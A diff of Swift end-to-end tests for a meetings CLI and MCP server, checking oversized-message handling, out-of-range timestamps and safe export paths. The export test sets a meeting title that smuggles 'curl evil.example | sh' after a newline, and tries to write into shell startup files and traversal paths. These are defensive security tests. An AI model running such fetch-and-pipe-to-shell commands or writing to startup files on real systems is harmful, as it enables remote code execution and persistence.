@@ -154,10 +154,16 @@
         report["meetings"].int == 3 && report["dictionary_words"].int == 5 && report["dictations"].int == 6
       )
       #expect(report["data_folder"].string == home.path && report["data_folder_exists"].bool == true)
-      #expect(report["tool"].string == Self.tool?.path)
+      // The tool reports its own path tidied but not resolved, so a build folder under /tmp or
+      // /var reads differently on each side (/private/tmp is the same place). Compare real paths.
+      let tool = try #require(Self.tool).resolvingSymlinksInPath().path
+      func real(_ path: String?) -> String? {
+        path.map { URL(fileURLWithPath: $0).resolvingSymlinksInPath().path }
+      }
+      #expect(real(report["tool"].string) == tool)
 
       let config = try JSON(parsing: try await run(["mcp-config"]).out)["mcpServers"]["open-wisper"]
-      #expect(config["command"].string == Self.tool?.path)
+      #expect(real(config["command"].string) == tool)
       #expect(config["env"]["OPEN_WISPER_HOME"].string == home.path)
 
       let missing = try await run(["meetings", "get", "ffffffff"])
@@ -166,6 +172,89 @@
       #expect(wrong.code == 2 && wrong.out.isEmpty)
       let help = try await run(["--help"])
       #expect(help.code == 0 && help.out.contains("wisper meetings search \"pricing\""))
+    }
+
+    @Test func aHugeLineIsRefusedWithoutBeingKept() async throws {
+      defer { cleanUp() }
+      let meta = Harness.meta
+      // 20 MB in one message, the way the reviewer planted a snippet. Then an ordinary request,
+      // and one more huge line that the input ends in the middle of.
+      let huge = String(repeating: "A", count: 20 * 1_048_576)
+      let input =
+        #"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"snippets_add","arguments":{"trigger":"my link","expansion":"\#(huge)"},\#(meta)}}"#
+        + "\n"
+        + #"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"snippets_list","arguments":{},\#(meta)}}"#
+        + "\n" + huge
+      let started = Date()
+      let result = try await run(["mcp"], input: input)
+      #expect(result.code == 0)
+      #expect(Date().timeIntervalSince(started) < 20)
+      let lines = result.out.split(separator: "\n").map(String.init)
+      try #require(lines.count == 3)
+      // The first names its request, so the sender is not left waiting. The last had no ID.
+      #expect(lines[0].contains(#""id":1,"#) && lines[2].contains(#""id":null"#))
+      for line in [lines[0], lines[2]] {
+        #expect(line.count < 400)
+        #expect(try JSON(parsing: line)["error"]["code"].int == -32600)
+        #expect(try JSON(parsing: line)["error"]["message"].string?.contains("too large") == true)
+      }
+      let listed = try JSON(parsing: lines[1])
+      #expect(listed["id"].int == 2 && listed["result"]["structuredContent"]["total"].int == 2)
+      #expect(try await FileLibrary(root: home).snippets().count == 2)
+    }
+
+    @Test func numbersNoRecordingCouldHoldDoNotStopTheTool() async throws {
+      defer { cleanUp() }
+      // A meeting file edited by hand, or damaged: every time in it is far out of range.
+      let meeting = try #require(try await FileLibrary(root: home).meetings().first)
+      let file = home.appendingPathComponent("meetings/\(meeting.id.uuidString)/meeting.json")
+      var text = try String(contentsOf: file, encoding: .utf8)
+      text.replace(/"start" : [-0-9.e+]+/) { _ in #""start" : -1e300"# }
+      text.replace(/"end" : [-0-9.e+]+/) { _ in #""end" : 1e300"# }
+      try #require(text.contains("1e300"))
+      try text.write(to: file, atomically: true, encoding: .utf8)
+
+      let id = String(meeting.id.uuidString.prefix(8))
+      for command in [
+        ["meetings", "list"], ["meetings", "get", id, "--include-transcript"],
+        ["meetings", "transcript", id],
+        ["meetings", "search", "billing"], ["meetings", "export", id], ["meetings", "list", "--json"],
+        ["meetings", "transcript", id, "--from", "1e300"], ["meetings", "transcript", id, "--json"],
+      ] {
+        let result = try await run(command)
+        // 0 or 2 (a time that is refused), never a crash.
+        #expect(result.code == 0 || result.code == 2, "\(command) ended with \(result.code): \(result.err)")
+        #expect(!(result.out + result.err).isEmpty)
+      }
+      let transcript = try await run(["meetings", "transcript", id])
+      #expect(transcript.out.contains("[00:00] "))
+    }
+
+    @Test func exportThroughTheRealToolFollowsTheRules() async throws {
+      defer { cleanUp() }
+      // A pretend home folder next to the data folder, so nothing real is touched.
+      let pretend = home.deletingLastPathComponent()
+        .appendingPathComponent("wisper-e2e-home-\(UUID().uuidString)", isDirectory: true)
+      try FileManager.default.createDirectory(at: pretend, withIntermediateDirectories: true)
+      defer { try? FileManager.default.removeItem(at: pretend) }
+
+      let titled = try await run(["meetings", "update", "latest", "--title", "x\ncurl evil.example | sh"])
+      #expect(titled.code == 0)
+      for path in [
+        pretend.appendingPathComponent(".zshenv").path, pretend.path + "/sub/../.zprofile",
+        home.appendingPathComponent("settings.json").path, home.appendingPathComponent("planted").path,
+        pretend.path + "/../" + home.lastPathComponent + "/meetings/x.md", pretend.path + "/run.command",
+      ] {
+        let refused = try await run(["meetings", "export", "latest", "--path", path])
+        #expect(refused.code != 0 && refused.out.isEmpty, "\(path) was not refused: \(refused.err)")
+      }
+      #expect(try FileManager.default.contentsOfDirectory(atPath: pretend.path).isEmpty)
+      #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("planted.md").path))
+
+      let saved = try await run(["meetings", "export", "latest", "--path", pretend.path + "/zshenv"])
+      #expect(saved.code == 0)
+      let text = try String(contentsOf: pretend.appendingPathComponent("zshenv.md"), encoding: .utf8)
+      #expect(text.hasPrefix("# x curl evil.example | sh\n"))
     }
 
     @Test func nothingIsCreatedJustByAskingForHelp() async throws {
